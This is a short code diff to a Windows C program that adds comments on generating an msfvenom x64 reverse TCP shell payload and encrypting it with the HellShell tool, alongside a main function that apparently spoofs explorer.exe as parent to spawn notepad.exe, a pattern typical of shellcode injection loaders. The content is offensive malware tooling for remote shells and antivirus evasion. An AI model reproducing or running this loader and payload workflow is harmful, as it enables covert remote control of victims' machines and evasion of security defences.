@@ -1,3 +1,6 @@
+// msfvenom -p windows/x64/shell_reverse_tcp  LHOST=ip LPORT=port -f raw -o shell.bin 
+// HellShell.exe shell.bin  aes
+// https://github.com/alex14324/Hellshell Tool hellshell 
 #include <windows.h>
 #include <stdio.h>
 #include <Psapi.h>
@@ -327,7 +330,7 @@ BOOL ppid(HANDLE hparentprocess, LPCSTR process_name, HANDLE* hthread, HANDLE* h
 }
 
 
-
+ 
 int main() {
     LPCWSTR parentprocess = L"explorer.exe";
     LPCSTR process_name = "notepad.exe";
